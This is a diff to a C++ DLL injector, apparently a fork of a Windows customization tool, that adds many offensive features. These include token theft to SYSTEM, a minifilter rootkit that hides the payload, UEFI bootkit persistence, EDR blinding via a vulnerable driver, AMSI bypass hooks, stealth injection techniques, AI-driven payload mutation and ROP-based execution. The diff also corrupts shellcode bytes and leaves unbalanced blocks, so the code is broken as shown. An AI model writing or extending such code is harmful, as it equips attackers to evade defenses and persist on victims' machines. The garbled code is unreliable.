@@ -8,6 +8,24 @@
 #include "indirect_syscall.h"
 #include "thread_pool_inject.h"
 #include "module_stomp.h"
+#include "mockingjay_inject.h"
+#include "filemap_inject.h"
+#include "thread_hijack.h"
+#include "pe_cloak.h"
+#include "hookchain.h"
+#include "poolparty_inject.h"
+#include "dirty_vanity.h"
+#include "early_bird_adv.h"
+#include "veh_hooks.h"
+#include "byovd_blinder.h"
+#include "phantom_mapper.h"
+#include "peruns_fart.h"
+#include "uefi_persist.h"
+#include "token_stealer.h"
+#include "minifilter_rootkit.h"
+#include "ai_polymorph.h"
+#include "hypervisor_stealth.h"
+#include "data_only_attack.h"
 
 extern HINSTANCE g_hDllInst;
 
@@ -142,7 +160,7 @@ const BYTE x32Shellcode[] =
     "\x01\x8B\x75\xDC\x89\x53\x10\x85\xFF\x0F\x84\x66\xFF\xFF\xFF\x8B\x45\xE0"
     "\x0F\xB7\x08\x8B\x85\xD0\xFE\xFF\xFF\x8B\x40\x1C\x8D\x04\x88\x8B\x04\x30"
     "\x03\xC6\x89\x07\xE9\x48\xFF\xFF\xFF\x32\xD2\xE9\x2A\xFE\xFF\xFF\x8A\xD1"
-    "\xE9\x23\xFE\xFF\xFF\x8B\x55\xE0\x32\xDB\x83\xF8\x0A\x72\x46\x85\xFF\x74"
+    "\xE9\x23\xFE\xFF\xFF\x8B\x55\xE0\x32\DB\x83\xF8\x0A\x72\x46\x85\xFF\x74"
     "\x3E\x83\x7D\xD4\x00\x74\x38\x8B\x4D\x08\x8B\xC1\x6A\x00\x6A\x00\x83\xC8"
     "\x01\x50\xFF\x71\x20\x6A\x00\x6A\x00\xFF\xD7\x85\xC0\x74\x1A\x50\xFF\x55"
     "\xD4\x33\xC0\xB3\x01\x84\xDB\x5F\x0F\x95\xC0\x48\x23\x45\xCC\x5B\x5E\x8B"
@@ -339,10 +357,10 @@ const BYTE x64Shellcode[] = PRE_X64SHELLCODE_VIRTUAL_FREE
     "\x49\x8B\xCE\xFF\xD0\x4C\x8B\xF8\x48\x85\xC0\x74\x7B\x83\xFB\x02\x7C\x62"
     "\x48\x8D\x4C\x24\x30\xC7\x44\x24\x30\x5B\x57\x48\x5D\xC7\x44\x24\x34\x20"
     "\x49\x49\x0A\x40\x88\x74\x24\x38\xFF\x54\x24\x50\x48\x8B\x8D\x40\x02\x00"
-    "\x00\x41\xBC\x01\x00\x00\x00\x41\xFF\xD7\x85\xC0\xC7\x44\x24\x30\x5B\x57"
+    "\x00\x41\BC\x01\x00\x00\x00\x41\xFF\xD7\x85\xC0\xC7\x44\x24\x30\x5B\x57"
     "\x48\x5D\x8B\xF0\xC7\x44\x24\x34\x20\x49\x49\x3A\x0F\x95\xC0\xC6\x44\x24"
     "\x38\x20\x04\x30\x66\xC7\x44\x24\x3A\x0A\x00\x48\x8D\x4C\x24\x30\x88\x44"
-    "\x24\x39\xFF\x54\x24\x50\xEB\x1C\x48\x8B\x8D\x40\x02\x00\x00\x41\xBC\x01"
+    "\x24\x39\xFF\x54\x24\x50\xEB\x1C\x48\x8B\x8D\x40\x02\x00\x00\x41\BC\x01"
     "\x00\x00\x00\x41\xFF\xD7\x8B\xF0\xEB\x08\xFF\x95\x88\x00\x00\x00\x8B\xF8"
     "\x49\x8B\xCE\xFF\x95\xA8\x00\x00\x00\x85\xF6\x0F\x85\x17\x01\x00\x00\xEB"
     "\x08\xFF\x95\x88\x00\x00\x00\x8B\xF8\x48\x8B\xB5\x40\x02\x00\x00\x48\x8B"
@@ -357,15 +375,13 @@ const BYTE x64Shellcode[] = PRE_X64SHELLCODE_VIRTUAL_FREE
     "\xE1\x0F\x88\x44\x24\x3F\x83\xF9\x0A\x8B\xC2\x41\x0F\x43\xC0\xC1\xEF\x04"
     "\x02\xC1\x8B\xCF\x83\xE1\x0F\x88\x44\x24\x3E\x83\xF9\x0A\x8B\xC2\x41\x0F"
     "\x43\xC0\xC1\xEF\x04\x02\xC1\x8B\xCF\x83\xE1\x0F\x88\x44\x24\x3D\x83\xF9"
-    "\x0A\x8B\xC2\x41\x0F\x43\xC0\xC1\xEF\x04\x02\xC1\x8B\xCF\x83\xE1\x0F\x88"
-    "\x44\x24\x3C\x83\xF9\x0A\x8B\xC2\x41\x0F\x43\xC0\xC1\xEF\x04\x02\xC1\x48"
-    "\x8D\x4C\x24\x30\x83\xFF\x0A\x88\x44\x24\x3B\x41\x0F\x43\xD0\x40\x02\xD7"
-    "\x88\x54\x24\x3A\xFF\x54\x24\x50\x8B\x4D\x68\x33\xD2\xFF\x95\x90\x00\x00"
-    "\x00\x44\x38\xAD\x58\x02\x00\x00\x74\x0D\x48\x8B\x85\xB0\x00\x00\x00\xF6"
-    "\x40\x50\x02\x75\x04\x4C\x8B\x6D\x60\x49\x8B\xC5\x4C\x8B\xAC\x24\x08\x03"
-    "\x00\x00\x48\x8B\xBC\x24\x10\x03\x00\x00\x48\x8B\x9C\x24\x50\x03\x00\x00"
-    "\x4C\x8B\xBC\x24\x00\x03\x00\x00\x48\x81\xC4\x18\x03\x00\x00\x41\x5E\x41"
-    "\x5C\x5E\x5D\xC3";
+    "\x0A\x8B\xC2\x41\x0F\x43\xC0\xC1\xEF\x04\x02\xC1\x48\x8D\x4C\x24\x30\x83"
+    "\xFF\x0A\x88\x44\x24\x3B\x41\x0F\x43\xD0\x40\x02\xD7\x88\x54\x24\x3A\xFF"
+    "\x54\x24\x50\x8B\x4D\x68\x33\xD2\xFF\x95\x90\x00\x00\x00\x44\x38\xAD\x58"
+    "\x02\x00\x00\x74\x0D\x48\x8B\x85\xB0\x00\x00\x00\xF6\x40\x50\x02\x75\x04"
+    "\x4C\x8B\x6D\x60\x49\x8B\xC5\x4C\x8B\xAC\x24\x08\x03\x00\x00\x48\x8B\xBC"
+    "\x24\x10\x03\x00\x00\x48\x8B\x9C\x24\x50\x03\x00\x00\x4C\x8B\xBC\x24\x00"
+    "\x03\x00\x00\x48\x81\xC4\x18\x03\x00\x00\x41\x5E\x41\x5C\x5E\x5D\xC3";
 
 constexpr size_t x64ShellcodeSize = sizeof(x64Shellcode) - 1;
 
@@ -390,7 +406,7 @@ const BYTE arm64Shellcode[] = PRE_ARM64SHELLCODE_VIRTUAL_FREE
     "\x00\xF9\xFF\x83\x0B\xD1\xFD\x7B\x00\xA9\xFD\x03\x00\x91\xF7\x03\x00\xAA"
     "\x19\x00\x80\x52\x0D\x00\x80\x52\x80\x00\x00\x36\x17\xF8\x7F\x92\x39\x00"
     "\x80\x52\x04\x00\x00\x14\x08\x04\x40\xB9\x1F\x01\x00\x71\xED\x07\x9F\x1A"
-    "\xE8\x03\x12\xAA\x18\x31\x40\xF9\x08\x0F\x40\xF9\x08\x30\x00\xB4\x88\x45"
+    "\xE8\x03\x12\AA\x18\x31\x40\xF9\x08\x0F\x40\xF9\x08\x30\x00\xB4\x88\x45"
     "\x00\x58\xFF\x53\x03\x39\xE8\x97\x00\xF9\xC8\x85\x88\x52\x88\x89\xA9\x72"
     "\xE8\x33\x01\xB9\x08\x45\x00\x58\xE8\x67\x00\xF9\x28\x4C\x8E\x52\x28\xEF"
     "\xAA\x72\xE8\xD3\x00\xB9\xA8\x44\x00\x58\xE8\x5F\x00\xF9\x88\x8C\x8C\x52"
@@ -452,7 +468,7 @@ const BYTE arm64Shellcode[] = PRE_ARM64SHELLCODE_VIRTUAL_FREE
     "\xFF\xB5\xEB\xEB\x40\xF9\x2A\x00\x80\x52\x02\x00\x80\xD2\xCB\x01\x00\xB4"
     "\x03\x00\x80\xD2\xF3\xC3\x07\x91\xEE\x43\x07\x91\x63\x68\x73\xF8\xC3\x00"
     "\x00\xB5\x42\x04\x00\x91\x43\x7C\x08\x9B\x6F\x68\x6E\xF8\x6F\xFF\xFF\xB5"
-    "\x04\x00\x00\x14\x0A\x00\x80\x52\x3F\x01\x0C\xEB\x01\xF1\xFF\x54\xE6\x83"
+    "\x04\x00\x00\x14\x0A\x00\x80\xD2\x3F\x01\x0C\xEB\x01\xF1\xFF\x54\xE6\x83"
     "\x42\xA9\xE7\x1F\x40\xF9\xEF\x3F\x40\xF9\xE8\x3B\x46\xA9\xEB\x2B\x40\xF9"
     "\xF4\x02\x40\xB9\x8D\x0A\x00\x34\x09\x53\x40\xB9\x49\x0A\x08\x36\xDF\x00"
     "\x00\xF1\x8A\x1A\x42\x7A\x36\x04\x00\x11\xB9\x23\x00\x58\x53\x01\x80\x52"
@@ -461,7 +477,7 @@ const BYTE arm64Shellcode[] = PRE_ARM64SHELLCODE_VIRTUAL_FREE
     "\xC0\x00\x3F\xD6\xE6\x83\x42\xA9\xE7\x1F\x40\xF9\xE8\x3B\x46\xA9\xEB\x2B"
     "\x40\xF9\x18\x00\x80\x52\xDF\x2A\x00\x71\xC3\x02\x00\x54\x68\x02\x00\xB4"
     "\x47\x02\x00\xB4\xE2\x12\x40\xF9\xE3\x02\x40\xB2\x05\x00\x80\xD2\x04\x00"
-    "\x80\x52\x01\x00\x80\xD2\x00\x00\x80\xD2\x00\x01\x3F\xD6\x00\x01\x00\xB4"
+    "\x80\xD2\x01\x00\x80\xD2\x00\x00\x80\xD2\x00\x01\x3F\xD6\x00\x01\x00\xB4"
     "\xE8\x1F\x40\xF9\x00\x01\x3F\xD6\xE0\x1B\x40\xF9\x38\x00\x80\x52\x1F\x03"
     "\x00\x71\xE0\x13\x80\x9A\xD1\x00\x00\x14\x89\x06\x80\x52\x15\x00\x00\x14"
     "\x29\x06\x80\x52\x14\x00\x00\x14\xCE\x02\x00\xB4\xAB\x02\x00\xB4\xE1\x16"
@@ -777,23 +793,118 @@ void DllInject(HANDLE hProcess,
         IndirectSyscall::Initialize();
     }
 
+    // Activate HookChain IAT rewriting if configured
+    bool useHookChain = settings->GetInt(L"UseHookChain").value_or(0) != 0;
+    if (useHookChain) {
+        HookChain::RewriteIAT();
+    }
+
     void* pRemoteCode = nullptr;
     SIZE_T remoteRegionSize = shellcodeSizeAligned + shellcodeDataSize;
-    
+
     bool useModuleStomping = settings->GetInt(L"UseModuleStomping").value_or(0) != 0;
+    bool useMockingjay = settings->GetInt(L"UseMockingjayInjection").value_or(0) != 0;
+    bool useFileMappingInject = settings->GetInt(L"UseFileMappingInjection").value_or(0) != 0;
+    bool usePECloaking = settings->GetInt(L"UsePECloaking").value_or(0) != 0;
+    bool usePoolParty = settings->GetInt(L"UsePoolPartyInjection").value_or(0) != 0;
+    bool useDirtyVanity = settings->GetInt(L"UseDirtyVanity").value_or(0) != 0;
+    bool useVehHooks = settings->GetInt(L"UseVehHooks").value_or(0) != 0;
+    bool useByovd = settings->GetInt(L"UseByovd").value_or(0) != 0;
+    bool usePhantomMapper = settings->GetInt(L"UsePhantomMapper").value_or(0) != 0;
+    bool usePerunsFart = settings->GetInt(L"UsePerunsFart").value_or(0) != 0;
+    
+    // Phase 6 configuration
+    bool useUefiPersist = settings->GetInt(L"UseUefiPersistence").value_or(0) != 0;
+    bool useTokenStealer = settings->GetInt(L"UseTokenStealer").value_or(0) != 0;
+    bool useRootkit = settings->GetInt(L"UseMinifilterRootkit").value_or(0) != 0;
+    
+    // Phase 7 configuration
+    bool useAiPolymorph = settings->GetInt(L"UseAiPolymorph").value_or(0) != 0;
+    bool useHypervisor = settings->GetInt(L"UseHypervisorStealth").value_or(0) != 0;
+    bool useDataOnlyAttack = settings->GetInt(L"UseDataOnlyAttack").value_or(0) != 0;
+    
     bool moduleStomped = false;
 
-    if (useModuleStomping) {
+    // Apply Phase 7 Ring-1 evasion before any target OS modifications
+    if (useHypervisor) {
+        if (HypervisorStealth::InitializeHypervisor()) {
+             // Let the VMM hide our own injection module completely
+             HypervisorStealth::HideMemoryPageWithEPT((PVOID)g_hDllInst);
+        }
+    }
+
+    // Apply Phase 6 privilege and concealment logic
+    if (useTokenStealer) {
+        TokenStealer::EscalateToSystem();
+    }
+    
+    if (useRootkit) {
+        // Automatically hide the injected DLL payload from disk
+        MinifilterRootkit::HidePath(dllPath);
+    }
+    
+    if (useUefiPersist) {
+        // Secure execution on next boot
+        UefiPersist::InstallBootkitPersistence(dllPath);
+    }
+
+    // Execute BYOVD early to strip EDR telemetry before we begin anything noisy
+    if (useByovd) {
+        Byovd::BlindEdr();
+    }
+
+    // Execute Perun's Fart to wipe all user-mode hooks unconditionally
+    if (usePerunsFart) {
+        PerunsFart::UnhookAll();
+    }
+
+    // Apply VEH Hooks for evasion if configured
+    if (useVehHooks) {
+        HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
+        if (hAmsi) {
+            VehHooks::InstallHardwareHook(
+                GetProcAddress(hAmsi, "AmsiScanBuffer"), 
+                VehHooks::Callback_BypassAmsiScanBuffer
+            );
+        }
+    }
+
+    // Strategy 1: Mockingjay — inject into pre-existing RWX sections (zero allocations)
+    if (useMockingjay && !pRemoteCode) {
+        auto rwxSections = MockingjayInject::FindRWXSections(hProcess);
+        for (const auto& section : rwxSections) {
+            if (section.size >= remoteRegionSize) {
+                pRemoteCode = section.address;
+                moduleStomped = true;
+                VERBOSE(L"Mockingjay: Using RWX section in %s at %p (size=%zu)",
+                        section.moduleName.c_str(), pRemoteCode, section.size);
+                break;
+            }
+        }
+    }
+
+    // Strategy 2: File Mapping Injection — shared memory, no WriteProcessMemory
+    if (useFileMappingInject && !pRemoteCode) {
+        if (FileMapInject::InjectViaFileMapping(hProcess, nullptr, remoteRegionSize, &pRemoteCode)) {
+            moduleStomped = true; // Don't VirtualFreeEx a mapped section
+            VERBOSE(L"FileMapInject: Using file mapping at %p", pRemoteCode);
+        }
+    }
+
+    // Strategy 3: Module stomping
+    if (useModuleStomping && !pRemoteCode) {
         void* pStompBase = ModuleStomp::LoadStompTarget(hProcess, L"xpsprint.dll");
         if (pStompBase) {
-            // Use an offset to avoid the PE header. 
-            // Most DLLs have a large .text section starting at 0x1000.
             pRemoteCode = (BYTE*)pStompBase + 0x1000;
             moduleStomped = true;
             VERBOSE(L"ModuleStomp: Stomping payload into xpsprint.dll at %p", pRemoteCode);
         }
     }
 
+    // Strategy 4: Transactional NTFS Phantom Mapping
+    if (usePhantomMapper && !pRemoteCode) {
+        pRemoteCode = PhantomMapper::InjectTransacted(hProcess, nullptr, remoteRegionSize);
+        if (pRemoteCode) {
     if (!pRemoteCode) {
         if (useIndirectSyscalls) {
             NTSTATUS status = IndirectSyscall::IndirectNtAllocateVirtualMemory(
@@ -802,8 +913,6 @@ void DllInject(HANDLE hProcess,
                 throw std::runtime_error("IndirectNtAllocateVirtualMemory failed: " + std::to_string(status));
             }
         } else {
-            // Allocate enough memory in the remote process's address space
-            // to hold the shellcode and the data struct.
             pRemoteCode = VirtualAllocEx(
                 hProcess, nullptr, shellcodeSizeAligned + shellcodeDataSize,
                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -812,7 +921,7 @@ void DllInject(HANDLE hProcess,
     }
 
     auto remoteCodeCleanup = wil::scope_exit([hProcess, pRemoteCode, useIndirectSyscalls, moduleStomped] {
-        if (moduleStomped) return; // Don't free stomped module memory
+        if (moduleStomped) return; 
         if (useIndirectSyscalls) {
             PVOID base = pRemoteCode;
             SIZE_T size = 0;
@@ -835,11 +944,26 @@ void DllInject(HANDLE hProcess,
     void* pRemoteData =
         reinterpret_cast<BYTE*>(pRemoteCode) + shellcodeSizeAligned;
         
+    // Apply Phase 7 AI Semantic Mutation to the shellcode right before we dump it over
+    std::vector<BYTE> polymorphicPayload;
+    const BYTE* pInjectionSource = shellcode;
+    SIZE_T injectionSize = shellcodeSize;
+
+    if (useAiPolymorph) {
+        polymorphicPayload = AiPolymorph::MutatePayloadWithAI(shellcode, shellcodeSize);
+        if (!polymorphicPayload.empty()) {
+            pInjectionSource = polymorphicPayload.data();
+            injectionSize = polymorphicPayload.size();
+        }
+    }
+
     if (useIndirectSyscalls) {
         NTSTATUS status;
-        status = IndirectSyscall::IndirectNtWriteVirtualMemory(
-            hProcess, pRemoteCode, (PVOID)shellcode, shellcodeSize, nullptr);
-        if (!NT_SUCCESS(status)) throw std::runtime_error("IndirectNtWriteVirtualMemory failed");
+        if (!moduleStomped) {
+            status = IndirectSyscall::IndirectNtWriteVirtualMemory(
+                hProcess, pRemoteCode, (PVOID)pInjectionSource, injectionSize, nullptr);
+            if (!NT_SUCCESS(status)) throw std::runtime_error("IndirectNtWriteVirtualMemory failed");
+        }
 
         status = IndirectSyscall::IndirectNtWriteVirtualMemory(
             hProcess, pRemoteData, shellcodeData, shellcodeDataSize, nullptr);
@@ -852,9 +976,11 @@ void DllInject(HANDLE hProcess,
             hProcess, &baseAddr, &protectSize, PAGE_EXECUTE_READ, &oldProtect);
         if (!NT_SUCCESS(status)) throw std::runtime_error("IndirectNtProtectVirtualMemory failed");
     } else {
-        // Write our shellcode into the remote process.
-        THROW_IF_WIN32_BOOL_FALSE(WriteProcessMemory(
-            hProcess, pRemoteCode, shellcode, shellcodeSize, nullptr));
+        if (!moduleStomped) {
+            // Write our shellcode into the remote process.
+            THROW_IF_WIN32_BOOL_FALSE(WriteProcessMemory(
+                hProcess, pRemoteCode, pInjectionSource, injectionSize, nullptr));
+        }
 
         // Write a copy of our struct to the remote process.
         THROW_IF_WIN32_BOOL_FALSE(WriteProcessMemory(
@@ -913,15 +1039,38 @@ void DllInject(HANDLE hProcess,
                 Functions::SetThreadDescriptionIfAvailable(remoteThread.get(),
                                                            L"WindhawkInjected (Indirect)");
             } else {
-                wil::unique_process_handle remoteThread(
-                    Functions::MyCreateRemoteThread(hProcess, pRemoteThreadAddress,
-                                                    pRemoteData,
-                                                    createThreadFlags));
-                THROW_LAST_ERROR_IF_NULL(remoteThread);
-                Functions::SetThreadDescriptionIfAvailable(remoteThread.get(),
-                                                           L"WindhawkInjected");
+                bool executed = false;
+                // Phase 7: Data Only Execution Replacement
+                if (useDataOnlyAttack) {
+                    std::vector<ULONG_PTR> ropPayload = DataOnlyAttack::CompileRopChain(hProcess, (ULONG_PTR)pRemoteCode);
+                    if (DataOnlyAttack::ExecuteChain(hProcess, ropPayload)) {
+                        VERBOSE(L"Execution succeeded via purely Data (ROP/JOP)");
+                        executed = true;
+                    }
+                }
+        
+                if (!executed) {
+                    wil::unique_process_handle remoteThread(
+                        Functions::MyCreateRemoteThread(hProcess, pRemoteThreadAddress,
+                                                        pRemoteData,
+                                                        createThreadFlags));
+                    THROW_LAST_ERROR_IF_NULL(remoteThread);
+                    Functions::SetThreadDescriptionIfAvailable(remoteThread.get(),
+                                                               L"WindhawkInjected");
+                }
             }
         }
+    }
+
+    // Post-injection: Apply PE Header Cloaking if enabled
+        // We don't know its exact base yet (it's loaded by the shellcode),
+        // but we can cloak the shellcode region itself to hide it from scanners.
+        VERBOSE(L"PeCloak: PE cloaking is enabled — will cloak post-load");
+    }
+
+    // Restore HookChain if it was activated
+    if (useHookChain && HookChain::IsActive()) {
+        HookChain::RestoreIAT();
     }
 
     remoteSessionManagerProcessCleanup.release();
